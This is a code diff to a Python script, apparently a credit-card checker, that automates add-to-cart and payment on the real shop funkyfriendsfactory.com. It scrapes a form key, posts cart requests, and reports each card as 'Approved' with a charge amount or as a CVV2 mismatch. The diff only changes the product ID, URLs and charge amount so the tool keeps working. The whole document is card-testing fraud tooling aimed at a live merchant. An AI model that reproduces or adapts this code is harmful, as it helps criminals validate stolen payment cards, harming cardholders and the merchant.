@@ -52,7 +52,10 @@ class payflow_pro:
                 "Referer": "https://www.funkyfriendsfactory.com/",
             }
 
-            response = session.get('https://www.funkyfriendsfactory.com/maximus-mouse-sewing-pattern', headers=headers).text
+            response = session.get(
+                'https://www.funkyfriendsfactory.com/mrs-claus-christmas-doll-sewing-pattern-pdf',
+                headers=headers,
+            ).text
             form_key = re.search(r'form_key/([^/]+)', response).group(1)
             if "form_key" not in response:
                 print("NO SESSION VALID")
@@ -66,7 +69,7 @@ class payflow_pro:
             }
 
             data = {
-                'product': '568',
+                'product': '566',
                 'qty': '1',
                 'ajax_package_name': 'default',
                 'ajax_layout': 'orangemantra',
@@ -75,8 +78,7 @@ class payflow_pro:
             }
 
             response = session.post(
-                f'https://www.funkyfriendsfactory.com/ajaxcart/cart/add/uenc/aHR0cHM6Ly93d3cuZnVua3lmcmllbmRzZmFjdG9yeS5jb20vbWF4aW11cy1tb3VzZS1zZXdpbmctcGF0dGVybg,,/product/568/form_key/{form_key}/',
-
+                f'https://www.funkyfriendsfactory.com/ajaxcart/cart/add/uenc/aHR0cHM6Ly93d3cuZnVua3lmcmllbmRzZmFjdG9yeS5jb20vbXJzLWNsYXVzLWNocmlzdG1hcy1kb2xsLXNld2luZy1wYXR0ZXJuLXBkZg,,/product/566/form_key/{form_key}/',
                 headers=headers,
                 data=data,
             )
@@ -163,7 +165,7 @@ class payflow_pro:
                 mensaje = error.get_text(" ", strip=True)
 
             if mensaje is None:
-                return 'Approved! ✅', 'Charged $10.21'
+                return 'Approved! ✅', 'Charged $12.99'
 
             elif 'Please enter a valid Credit Card Verification Number' in mensaje:
                 return 'Approved! ✅', 'CVV2 Mismatch: 15004'
